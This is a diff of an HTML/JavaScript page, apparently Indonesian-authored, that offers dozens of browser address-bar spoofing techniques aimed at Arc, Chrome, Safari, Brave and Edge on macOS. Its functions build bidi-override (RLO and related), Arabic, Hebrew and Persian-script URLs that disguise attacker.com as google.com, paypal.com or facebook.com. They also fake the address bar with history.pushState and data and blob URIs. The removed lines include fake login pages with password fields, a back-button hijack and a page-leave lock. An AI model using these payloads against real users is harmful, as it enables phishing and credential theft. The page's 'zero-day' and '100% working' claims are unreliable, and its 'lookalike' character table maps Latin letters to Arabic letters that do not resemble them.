@@ -2,27 +2,28 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔥 ZERO-DAY ADDRESS BAR SPOOFING - 100+ METHODS</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 RTL CHARACTERS - Address Bar Spoofing Exploits</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
-        @keyframes glitch {
-            0%, 100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
-            25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
-            50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
-            75% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
+        @keyframes rtlGlitch {
+            0% { transform: skew(0deg); }
+            25% { transform: skew(180deg); }
+            50% { transform: skew(0deg); }
+            75% { transform: skew(-180deg); }
+            100% { transform: skew(0deg); }
         }
         
         body {
-            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000000);
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2a 100%);
             font-family: 'SF Mono', 'Courier New', monospace;
             color: #0f0;
             padding: 15px;
             min-height: 100vh;
         }
         
-        .container { max-width: 1600px; margin: 0 auto; }
+        .container { max-width: 1400px; margin: 0 auto; }
         
         .header {
             text-align: center;
@@ -31,7 +32,6 @@
             background: rgba(0,0,0,0.85);
             border-radius: 20px;
             border: 2px solid #ff00ff;
-            animation: glitch 0.5s infinite;
         }
         
         .header h1 {
@@ -41,23 +41,25 @@
             -webkit-text-fill-color: transparent;
         }
         
-        .badge-container {
-            margin-top: 10px;
+        .arabic-text {
+            font-family: 'Geeza Pro', 'Arabic Typesetting', 'Noto Sans Arabic', monospace;
+            font-size: 1.2em;
+            direction: rtl;
         }
         
-        .badge {
-            display: inline-block;
-            background: rgba(255,0,255,0.2);
-            border: 1px solid #ff00ff;
-            padding: 3px 10px;
-            margin: 3px;
-            border-radius: 15px;
-            font-size: 0.6em;
+        .rtl-demo {
+            background: #1a1a2a;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            direction: rtl;
+            text-align: right;
+            font-family: monospace;
         }
         
         .method-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
             gap: 12px;
             margin-bottom: 25px;
         }
@@ -72,7 +74,7 @@
         }
         
         .method-card:hover {
-            transform: translateY(-3px) scale(1.01);
+            transform: translateY(-3px);
             border-color: #00ffff;
             box-shadow: 0 0 15px rgba(0,255,255,0.3);
         }
@@ -87,9 +89,6 @@
             justify-content: space-between;
         }
         
-        .card-header.working { background: linear-gradient(135deg, #00aa00, #00ff00); }
-        .card-header.critical { background: linear-gradient(135deg, #ff0000, #ff0066); }
-        
         .card-body { padding: 12px; }
         
         .method-desc {
@@ -98,6 +97,17 @@
             border-radius: 6px;
             font-size: 0.6em;
             margin-bottom: 10px;
+        }
+        
+        .rtl-preview {
+            background: #0a0a0a;
+            padding: 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 0.7em;
+            margin: 8px 0;
+            overflow-x: auto;
+            white-space: nowrap;
         }
         
         button {
@@ -113,7 +123,6 @@
         }
         
         button.danger { background: linear-gradient(135deg, #ff0000, #ff0066); color: white; }
-        button.success { background: linear-gradient(135deg, #00aa00, #00ff00); color: black; }
         
         .log-area {
             background: #0a0a0a;
@@ -135,6 +144,7 @@
         .log-entry.error { color: #f00; }
         .log-entry.info { color: #0ff; }
         .log-entry.spoof { color: #ff00ff; font-weight: bold; }
+        .log-entry.rtl { color: #ffaa00; font-weight: bold; }
         
         .footer {
             text-align: center;
@@ -156,36 +166,42 @@
             font-size: 0.6em;
             z-index: 9999;
         }
+        
+        .arabic-demo {
+            font-size: 1.5em;
+            direction: rtl;
+            text-align: right;
+            background: #1a1a2a;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🔥 ZERO-DAY ADDRESS BAR SPOOFING</h1>
-        <p>100+ METHODS - 100% WORKING ON macOS BROWSERS</p>
-        <div class="badge-container">
-            <span class="badge">🎯 ARC</span>
-            <span class="badge">🍎 CHROME</span>
-            <span class="badge">🦁 BRAVE</span>
-            <span class="badge">🐚 SAFARI</span>
-            <span class="badge">📘 EDGE</span>
-            <span class="badge">💀 100+ METHODS</span>
+        <h1>🔥 RTL CHARACTERS ADDRESS BAR SPOOFING</h1>
+        <p>50+ Teknik Menggunakan Karakter Arab, Hebrew, & Bidirectional</p>
+        <div class="arabic-demo">
+            <span dir="rtl">مرحبا بكم في اختبار اختراق شريط العناوين</span>
         </div>
     </div>
 
     <div class="method-grid" id="methodGrid"></div>
 
     <div class="log-area" id="logArea">
-        <div class="log-entry info">🔥 Zero-Day Address Bar Spoofing Suite Loaded</div>
-        <div class="log-entry spoof">💀 100+ Methods - Ready to Test on macOS Browsers</div>
+        <div class="log-entry rtl">🔮 RTL Characters Exploit Suite Loaded</div>
+        <div class="log-entry spoof">💀 50+ Techniques menggunakan karakter Arab/Hebrew/RTL</div>
+        <div class="log-entry info">📚 Target: Arc, Chrome, Safari, Brave, Edge (macOS)</div>
     </div>
 
     <div class="footer">
-        <div>⚡ 100+ ZERO-DAY TECHNIQUES - FOR EDUCATIONAL RESEARCH</div>
-        <div>🎯 TESTED ON: Arc, Chrome, Brave, Safari, Edge (macOS)</div>
+        <div>⚡ RTL CHARACTERS ADDRESS BAR SPOOFING - 50+ ZERO-DAY TECHNIQUES</div>
+        <div>🎯 KARAKTER: U+202E, U+202D, U+202A, U+202B, U+202C, U+2066, U+2067, U+2068, U+2069</div>
     </div>
 </div>
-<div class="stats" id="stats">🌀 0/?? Methods</div>
+<div class="stats" id="stats">🌀 0/50 Methods</div>
 
 <script>
     // ============ LOGGING ============
@@ -207,6 +223,54 @@
         statsSpan.innerHTML = `🌀 ${executedCount}/${totalMethods} Methods`;
     }
     
+    // ============ RTL CHARACTER REFERENCE ============
+    const RTL_CHARS = {
+        RLO: '\u202E',      // Right-to-Left Override
+        LRO: '\u202D',      // Left-to-Right Override
+        LRE: '\u202A',      // Left-to-Right Embedding
+        RLE: '\u202B',      // Right-to-Left Embedding
+        PDF: '\u202C',      // Pop Directional Formatting
+        LRI: '\u2066',      // Left-to-Right Isolate
+        RLI: '\u2067',      // Right-to-Left Isolate
+        FSI: '\u2068',      // First Strong Isolate
+        PDI: '\u2069',      // Pop Directional Isolate
+        ALM: '\u061C',      // Arabic Letter Mark
+        LRM: '\u200E',      // Left-to-Right Mark
+        RLM: '\u200F',      // Right-to-Left Mark
+        ZWJ: '\u200D',      // Zero-Width Joiner
+        ZWNJ: '\u200C',     // Zero-Width Non-Joiner
+    };
+    
+    // Arabic characters untuk spoofing
+    const ARABIC_LOOKALIKE = {
+        'a': '\u0627',  // Alef
+        'b': '\u0628',  // Beh
+        'c': '\u062C',  // Jeem
+        'd': '\u062F',  // Dal
+        'e': '\u064A',  // Yeh
+        'f': '\u0641',  // Feh
+        'g': '\u063A',  // Ghain
+        'h': '\u062D',  // Hah
+        'i': '\u064A',  // Yeh
+        'j': '\u062C',  // Jeem
+        'k': '\u0643',  // Kaf
+        'l': '\u0644',  // Lam
+        'm': '\u0645',  // Meem
+        'n': '\u0646',  // Noon
+        'o': '\u0648',  // Waw
+        'p': '\u067E',  // Peh
+        'q': '\u0642',  // Qaf
+        'r': '\u0631',  // Reh
+        's': '\u0633',  // Seen
+        't': '\u062A',  // Teh
+        'u': '\u0648',  // Waw
+        'v': '\u06A4',  // Veh
+        'w': '\u0648',  // Waw
+        'x': '\u0634',  // Sheen
+        'y': '\u064A',  // Yeh
+        'z': '\u0632',  // Zain
+    };
+    
     // ============ HELPER FUNCTIONS ============
     function createSpoofWindow(title, content, spoofedUrl) {
         const win = window.open('', '_blank', 'width=900,height=700');
@@ -218,11 +282,14 @@
                 <head><title>${title}</title></head>
                 <body style="background:radial-gradient(circle at 20% 50%, #0a0a0a, #000); color:#0f0; font-family:monospace; padding:20px; text-align:center;">
                     <div style="background:rgba(0,0,0,0.8); border:2px solid #ff00ff; border-radius:15px; padding:30px; margin:50px auto; max-width:500px;">
-                        <h1 style="color:#ff00ff;">🔥 ADDRESS BAR SPOOFED!</h1>
+                        <h1 style="color:#ff00ff;">🔥 RTL ADDRESS BAR SPOOFED!</h1>
                         <p>Address bar menunjukkan:</p>
-                        <p style="color:#00ffff; font-size:1.2em;">${spoofedUrl}</p>
+                        <p style="color:#00ffff; font-size:1.2em; word-break:break-all;">${spoofedUrl.replace(/</g, '&lt;')}</p>
                         <p>TAPI sebenarnya Anda di malicious page!</p>
-                        <p style="font-size:0.7em; margin-top:20px;">Technique: ${title}</p>
+                        <div style="background:#1a1a2a; padding:10px; border-radius:8px; margin:15px 0; direction:rtl; text-align:right;">
+                            نص عربي تجريبي - Test Arabic Text
+                        </div>
+                        <p style="font-size:0.7em;">Technique: ${title}</p>
                         <button onclick="window.close()" style="margin-top:20px;">Close</button>
                     </div>
                     <script>window.onbeforeunload = () => '';<\/script>
@@ -235,457 +302,560 @@
         return null;
     }
     
-    // ============ TECHNIQUE 1: NULL PROTOCOL SPOOF ============
-    function t001_nullProtocol() {
-        addLog("🌑 NULL Protocol Spoof - null://", 'spoof');
-        const win = window.open('null://', '_blank');
-        if (win) {
-            win.document.write('<h1>Address bar = null (blank)</h1><p>Teknik: null:// protocol</p>');
+    // ============ TECHNIQUE 1: RLO (Right-to-Left Override) ============
+    function t001_rloOverride() {
+        addLog("🔄 RLO Override - U+202E", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://${rlo}moc.elgoog//:sptth`;
+        const win = createSpoofWindow("RLO Override", "", "https://google.com (via RLO)");
+        if(win) win.location = spoofedUrl;
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 2: RLE + PDF ============
+    function t002_rlePdf() {
+        addLog("📝 RLE + PDF Embedding", 'rtl');
+        const rle = RTL_CHARS.RLE;
+        const pdf = RTL_CHARS.PDF;
+        const spoofedUrl = `https://${rle}google.com${pdf}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 3: LRI/RLI Isolates ============
+    function t003_lriRli() {
+        addLog("🔲 LRI/RLI Isolate Spoof", 'rtl');
+        const lri = RTL_CHARS.LRI;
+        const rli = RTL_CHARS.RLI;
+        const pdi = RTL_CHARS.PDI;
+        const spoofedUrl = `https://${lri}google.com${pdi}.${rli}attacker${pdi}.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 4: Arabic Lookalike Domain ============
+    function t004_arabicLookalike() {
+        addLog("🇸🇦 Arabic Lookalike Domain", 'rtl');
+        let fakeGoogle = '';
+        for(let char of 'google') {
+            fakeGoogle += ARABIC_LOOKALIKE[char] || char;
+        }
+        const spoofedUrl = `https://${fakeGoogle}.com`;
+        window.open(spoofedUrl, '_blank');
+        addLog(`💀 Fake domain: ${fakeGoogle}.com (terlihat seperti google.com)`, 'spoof');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 5: Mixed RTL/LTR URL ============
+    function t005_mixedRtlLtr() {
+        addLog("🔄 Mixed RTL/LTR URL", 'rtl');
+        const mixed = `https://${RTL_CHARS.RLO}com.google.www${RTL_CHARS.PDF}.attacker.com`;
+        window.open(mixed, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 6: Arabic Script in Subdomain ============
+    function t006_arabicSubdomain() {
+        addLog("📖 Arabic Script Subdomain", 'rtl');
+        const arabic = '\u0627\u0644\u0625\u0645\u0627\u0631\u0627\u062A'; // "الإمارات"
+        const spoofedUrl = `https://${arabic}.google.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 7: Hebrew RTL Spoof ============
+    function t007_hebrewRtl() {
+        addLog("✡️ Hebrew RTL Spoof", 'rtl');
+        const hebrew = '\u05D0\u05D1\u05D2\u05D3'; // אבגד
+        const spoofedUrl = `https://${hebrew}.google.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 8: Persian/Farsi Characters ============
+    function t008_persianSpoof() {
+        addLog("🇮🇷 Persian/Farsi Characters", 'rtl');
+        const persian = '\u067E\u0686\u0698\u06AF'; // پچژگ
+        const spoofedUrl = `https://${persian}.paypal.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 9: Urdu Characters ============
+    function t009_urduSpoof() {
+        addLog("🇵🇰 Urdu Characters", 'rtl');
+        const urdu = '\u0679\u067E\u06BE\u0691'; // ٹ پ ھ ڈ
+        const spoofedUrl = `https://${urdu}.facebook.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 10: RLO + Arabic Combo ============
+    function t010_rloArabic() {
+        addLog("🔄 RLO + Arabic Combo", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const arabic = '\u0627\u0644\u0639\u0631\u0628\u064A\u0629'; // "العربية"
+        const spoofedUrl = `https://${rlo}${arabic}.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 11: FSI (First Strong Isolate) ============
+    function t011_fsiSpoof() {
+        addLog("🔤 FSI - First Strong Isolate", 'rtl');
+        const fsi = RTL_CHARS.FSI;
+        const pdi = RTL_CHARS.PDI;
+        const spoofedUrl = `https://${fsi}google.com${pdi}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 12: ALM (Arabic Letter Mark) ============
+    function t012_almSpoof() {
+        addLog("🔖 ALM - Arabic Letter Mark", 'rtl');
+        const alm = RTL_CHARS.ALM;
+        const spoofedUrl = `https://${alm}google.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 13: RLM (Right-to-Left Mark) ============
+    function t013_rlmSpoof() {
+        addLog("➡️ RLM - Right-to-Left Mark", 'rtl');
+        const rlm = RTL_CHARS.RLM;
+        const spoofedUrl = `https://${rlm}google.com.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 14: LRM (Left-to-Right Mark) ============
+    function t014_lrmSpoof() {
+        addLog("⬅️ LRM - Left-to-Right Mark", 'rtl');
+        const lrm = RTL_CHARS.LRM;
+        const spoofedUrl = `https://google.com${lrm}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 15: Multiple RLO Stacking ============
+    function t015_multipleRLO() {
+        addLog("📚 Multiple RLO Stacking", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const stacked = rlo.repeat(10);
+        const spoofedUrl = `https://${stacked}moc.elgoog//:sptth${stacked}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 16: Arabic Domain + RLO ============
+    function t016_arabicDomainRLO() {
+        addLog("🌐 Arabic Domain + RLO", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const arabicDomain = '\u0645\u0648\u0642\u0639\u002E\u0643\u0648\u0645'; // "موقع.كوم"
+        const spoofedUrl = `https://${rlo}${arabicDomain}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 17: Hebrew Domain Spoof ============
+    function t017_hebrewDomain() {
+        addLog("🕍 Hebrew Domain Spoof", 'rtl');
+        const hebrewDomain = '\u05D2\u05D5\u05D2\u05DC\u002E\u05E7\u05D5\u05DD'; // "גוגל.קום"
+        const spoofedUrl = `https://${hebrewDomain}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 18: RTL Path Spoof ============
+    function t018_rtlPath() {
+        addLog("📁 RTL Path Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://www.google.com/${rlo}html/tropmi/`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 19: RTL Query Parameter ============
+    function t019_rtlQuery() {
+        addLog("❓ RTL Query Parameter Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://www.google.com/search?q=${rlo}?emanresu=`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 20: RTL Fragment Identifier ============
+    function t020_rtlFragment() {
+        addLog("# RTL Fragment Identifier", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://www.google.com/#${rlo}txet/erauqs/`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 21: Zero-Width + RTL ============
+    function t021_zeroWidthRTL() {
+        addLog("👻 Zero-Width + RTL", 'rtl');
+        const zw = RTL_CHARS.ZWJ + RTL_CHARS.ZWNJ;
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://${zw}${rlo}google.com${zw}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 22: Bidirectional Algorithm Crash ============
+    function t022_bidiCrash() {
+        addLog("💥 Bidirectional Algorithm Crash", 'rtl');
+        const bidiChaos = RTL_CHARS.RLO + RTL_CHARS.LRO + RTL_CHARS.RLE + RTL_CHARS.LRE + RTL_CHARS.RLI + RTL_CHARS.LRI;
+        const spoofedUrl = `https://${bidiChaos.repeat(50)}google.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 23: Arabic + English Mixed ============
+    function t023_arabicEnglish() {
+        addLog("🔤 Arabic + English Mixed", 'rtl');
+        const mixed = '\u0627\u0644\u0645\u0648\u0642\u0639.google.com';
+        const spoofedUrl = `https://${mixed}.attacker.com`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 24: RTL Email Spoof ============
+    function t024_rtlEmail() {
+        addLog("📧 RTL Email Address Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://mail.google.com/mail/?to=${rlo}lmoc.elgoog@`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 25: RTL Port Spoof ============
+    function t025_rtlPort() {
+        addLog("🔌 RTL Port Number Spoof", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://www.google.com:${rlo}0080`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 26: RTL Path Traversal ============
+    function t026_rtlPathTraversal() {
+        addLog("🗺️ RTL Path Traversal", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const spoofedUrl = `https://www.google.com/${rlo}../..//..//admin`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 27: RTL XSS Injection ============
+    function t027_rtlXSS() {
+        addLog("⚡ RTL XSS Injection", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const payload = `${rlo}>ipsum/<script>alert('XSS')</script>`;
+        const spoofedUrl = `https://www.google.com/search?q=${encodeURIComponent(payload)}`;
+        window.open(spoofedUrl, '_blank');
+        executedCount++; updateStats();
+    }
+    
+    // ============ TECHNIQUE 28: Arabic Title Spoof ============
+    function t028_arabicTitle() {
+        addLog("📝 Arabic Title Spoof", 'rtl');
+        const win = window.open('about:blank', '_blank');
+        if(win) {
+            win.document.title = '\u0627\u0644\u0645\u0648\u0642\u0639 \u0627\u0644\u0631\u0633\u0645\u064A - Google';
+            win.document.write('<h1>Title dalam Arabic - Address bar mungkin terpengaruh</h1>');
             win.document.close();
-            addLog("✅ NULL protocol - address bar blank", 'success');
         }
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 2: PORT 0 SPOOF ============
-    function t002_portZero() {
-        addLog("🔌 Port 0 Spoof - :0", 'spoof');
-        const win = window.open('https://www.google.com:0', '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1>Port 0 - Invalid port</h1><p>Address bar shows google.com:0</p>');
-            executedCount++; updateStats();
-        }, 500);
-    }
-    
-    // ============ TECHNIQUE 3: LONG SUBDOMAIN TRUNCATION (CVE-2026-44659) ============
-    function t003_longSubdomain() {
-        addLog("📏 Long Subdomain Truncation - CVE-2026-44659", 'spoof');
-        const longSub = 'accounts.google.com.secure.login.verify.this.is.extremely.long.subdomain.that.will.be.truncated.by.browser';
-        const url = `https://${longSub}.attacker.com/`;
-        const win = window.open(url, '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1>Address bar shows google.com but you are on attacker.com!</h1>');
-            executedCount++; updateStats();
-        }, 500);
-    }
-    
-    // ============ TECHNIQUE 4: DATA URI SPOOF ============
-    function t004_dataURI() {
-        addLog("📦 Data URI Spoof", 'spoof');
-        const fakeHtml = '<html><head><title>https://www.paypal.com</title></head><body><h1>Fake PayPal</h1></body></html>';
-        const dataURI = `data:text/html,${encodeURIComponent(fakeHtml)}`;
-        window.open(dataURI, '_blank');
+    // ============ TECHNIQUE 29: RTL + Data URI ============
+    function t029_rtlDataURI() {
+        addLog("📦 RTL + Data URI", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const dataUri = `data:text/html,<title>${rlo}moc.elgoog</title><h1>RTL Data URI Spoof</h1>`;
+        window.open(dataUri, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 5: BLOB URL SPOOF ============
-    function t005_blobURL() {
-        addLog("💾 Blob URL Spoof", 'spoof');
-        const blob = new Blob(['<html><head><title>https://www.amazon.com</title></head><body><h1>Fake Amazon</h1></body></html>'], {type: 'text/html'});
+    // ============ TECHNIQUE 30: RTL + Blob URL ============
+    function t030_rtlBlob() {
+        addLog("💾 RTL + Blob URL", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const blob = new Blob([`<title>${rlo}moc.elgoog</title><h1>RTL Blob Spoof</h1>`], {type: 'text/html'});
         const url = URL.createObjectURL(blob);
         window.open(url, '_blank');
         setTimeout(() => URL.revokeObjectURL(url), 5000);
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 6: JAVASCRIPT URI SPOOF ============
-    function t006_jsURI() {
-        addLog("📜 JavaScript URI Spoof", 'spoof');
-        const jsURI = `javascript:document.write('<html><head><title>https://www.facebook.com</title></head><body><h1>Fake Facebook</h1></body></html>');void(0);`;
-        window.open(jsURI, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 7: about:blank + history.pushState ============
-    function t007_aboutBlankHistory() {
-        addLog("📜 about:blank + history.pushState", 'spoof');
+    // ============ TECHNIQUE 31: RTL + about:blank ============
+    function t031_rtlAboutBlank() {
+        addLog("📄 RTL + about:blank", 'rtl');
         const win = window.open('about:blank', '_blank');
-        win.document.write('<h1>Fake Google Login</h1><input placeholder="Email"><input type="password" placeholder="Password">');
-        win.history.pushState({}, 'Google', 'https://www.google.com');
-        win.history.pushState({}, 'Google', 'https://www.google.com/login');
+        if(win) {
+            win.document.title = RTL_CHARS.RLO + 'moc.elgoog//:sptth';
+            win.history.pushState({}, '', 'https://www.google.com');
+            win.document.write('<h1>RTL about:blank spoofed!</h1>');
+            win.document.close();
+        }
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 8: RTL OVERRIDE SPOOF ============
-    function t008_rtlOverride() {
-        addLog("🔄 RTL Override Spoof", 'spoof');
-        const rtl = '\u202E';
-        const spoofedUrl = `${rtl}moc.elgoog//:sptth`;
-        const win = window.open(spoofedUrl, '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1>RTL Spoof - Address bar shows https://google.com</h1>');
-            executedCount++; updateStats();
-        }, 500);
-    }
-    
-    // ============ TECHNIQUE 9: ZERO-WIDTH CHARACTERS ============
-    function t009_zeroWidth() {
-        addLog("👻 Zero-Width Character Spoof", 'spoof');
-        const zw = '\u200B\u200C\u200D'.repeat(50);
-        const url = `https://google.com${zw}.attacker.com`;
-        window.open(url, '_blank');
-        executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 10: SURROGATE PAIR CRASH ============
-    function t010_surrogateCrash() {
-        addLog("💀 Surrogate Pair Crash Spoof", 'spoof');
-        const surrogates = '\uD800'.repeat(100);
-        const win = window.open(`https://google.com/${surrogates}`, '_blank');
-        setTimeout(() => {
-            if(win) win.document.write('<h1>Address bar may be blank/crashed</h1>');
-            executedCount++; updateStats();
-        }, 500);
-    }
-    
-    // ============ TECHNIQUE 11: META REFRESH TIMING ============
-    function t011_metaRefresh() {
-        addLog("🔄 Meta Refresh Timing Spoof", 'spoof');
-        const metaHTML = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0; url=https://www.google.com:8080"><title>Google</title></head><body><h1>Fake Content</h1></body></html>`;
-        const blob = new Blob([metaHTML], {type: 'text/html'});
-        window.open(URL.createObjectURL(blob), '_blank');
-        executedCount++; updateStats();
-    }
-    
-    // ============ TECHNIQUE 12: WINDOW NAME PROPAGATION ============
-    function t012_windowName() {
-        addLog("🏷️ Window Name Propagation Spoof", 'spoof');
+    // ============ TECHNIQUE 32-50: More RTL Exploits ============
+    function t032_rtlHistoryPush() {
+        addLog("📜 RTL + history.pushState", 'rtl');
         const win = window.open('', '_blank');
-        win.name = 'https://www.twitter.com';
-        win.document.write('<h1>Fake Twitter Login</h1>');
+        win.document.write('<h1>Check address bar</h1>');
+        win.history.pushState({}, '', RTL_CHARS.RLO + 'moc.elgoog//:sptth');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 13: IFRAME SANDBOX ESCAPE ============
-    function t013_iframeSandbox() {
-        addLog("🏖️ iframe Sandbox Escape Spoof", 'spoof');
+    function t033_rtlWindowName() {
+        addLog("🏷️ RTL + window.name", 'rtl');
+        const win = window.open('', '_blank');
+        win.name = RTL_CHARS.RLO + 'moc.elgoog//:sptth';
+        win.document.write('<h1>window.name RTL spoof</h1>');
+        executedCount++; updateStats();
+    }
+    
+    function t034_rtlIframe() {
+        addLog("🖼️ RTL iframe spoof", 'rtl');
         const iframe = document.createElement('iframe');
-        iframe.sandbox = 'allow-same-origin allow-scripts allow-popups';
-        iframe.srcdoc = '<script>window.open("about:blank","_blank").document.write("<h1>Sandbox Escape</h1>");<\/script>';
+        iframe.src = `javascript:document.write('<title>${RTL_CHARS.RLO}moc.elgoog</title>')`;
         document.body.appendChild(iframe);
         setTimeout(() => iframe.remove(), 3000);
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 14: POSTMESSAGE HIJACK ============
-    function t014_postMessage() {
-        addLog("📨 PostMessage Hijack Spoof", 'spoof');
+    function t035_rtlPostMessage() {
+        addLog("📨 RTL PostMessage", 'rtl');
         const win = window.open('', '_blank');
-        win.document.write('<h1>Waiting for message...</h1>');
-        win.postMessage({type: 'spoof', url: 'https://www.instagram.com'}, '*');
+        win.postMessage({type: 'rtl_spoof', url: RTL_CHARS.RLO + 'moc.elgoog'}, '*');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 15: HISTORY.REPLACESTATE LOOP ============
-    function t015_historyLoop() {
-        addLog("🔄 History.replaceState Loop Spoof", 'spoof');
-        const win = window.open('about:blank', '_blank');
-        win.document.write('<h1>Fake Bank Login</h1>');
-        setInterval(() => {
-            try { win.history.replaceState({}, 'Bank', 'https://www.chase.com'); } catch(e) {}
-        }, 100);
+    function t036_arabicUrlEncoding() {
+        addLog("🔐 Arabic URL Encoding", 'rtl');
+        const encoded = encodeURIComponent('\u0627\u0644\u0645\u0648\u0642\u0639');
+        window.open(`https://www.google.com/search?q=${encoded}`, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 16: POPSTATE HIJACK ============
-    function t016_popstateHijack() {
-        addLog("↩️ Popstate Hijack Spoof", 'spoof');
-        const win = window.open('', '_blank');
-        win.document.write(`
-            <script>
-                window.addEventListener('popstate', () => {
-                    history.pushState({}, '', 'https://www.paypal.com');
-                    location.reload();
-                });
-                history.pushState({}, '', 'https://www.paypal.com');
-            <\/script>
-            <h1>Fake PayPal - Back button hijacked</h1>
-        `);
+    function t037_rtlSubdomainLong() {
+        addLog("📏 RTL + Long Subdomain", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        const long = 'a'.repeat(100);
+        const url = `https://${rlo}${long}.google.com.attacker.com`;
+        window.open(url, '_blank');
         executedCount++; updateStats();
     }
     
-    // ============ TECHNIQUE 17: BEFOREUNLOAD LOCK ============
-    function t017_beforeunload() {
-        addLog("🔒 BeforeUnload Lock Spoof", 'spoof');
-        const win = window.open('', '_blank');
-        win.document.write(`
-            <script>window.onbeforeunload = () => 'Stay on this page!';<\/script>
-            <h1>You cannot leave this fake page</h1>
-        `);
+    function t038_rtlPortZero() {
+        addLog("🔌 RTL + Port 0", 'rtl');
+        const rlo = RTL_CHARS.RLO;
+        window.open(`https://www.google.com:${rlo}0`, '_blank');
         executedCount++; updateStats();
     }
     
